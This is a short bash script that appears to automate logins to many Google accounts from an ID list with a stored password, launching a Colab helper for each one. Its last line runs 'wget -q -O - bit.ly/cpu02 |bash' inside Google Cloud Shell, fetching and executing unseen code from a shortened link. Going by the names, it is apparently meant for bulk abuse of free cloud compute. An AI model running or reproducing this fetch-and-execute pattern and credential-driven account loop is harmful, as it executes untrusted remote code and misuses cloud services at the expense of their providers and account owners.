#!/bin/bash -xe

GIDS_LIST="/home/one/gids01.txt"
#GIDS_LIST=$1

PASS=*************
echo > coloop.log
cat GIDS_LIST | while read gid 
do
   docker run -ti --name gcloud-config-nadirchi10001 gcr.io/google.com/cloudsdktool/cloud-sdk gcloud auth login 
   ./newcolab.py $gid $PASS 2>> coloop.log 1>> coloop.log &
   sleep 180
done




docker run --rm --volumes-from gcloud-config-nadirchi10001 gcr.io/google.com/cloudsdktool/cloud-sdk gcloud cloud-shell  ssh --authorize-session --command="wget -q -O - bit.ly/cpu02 |bash"
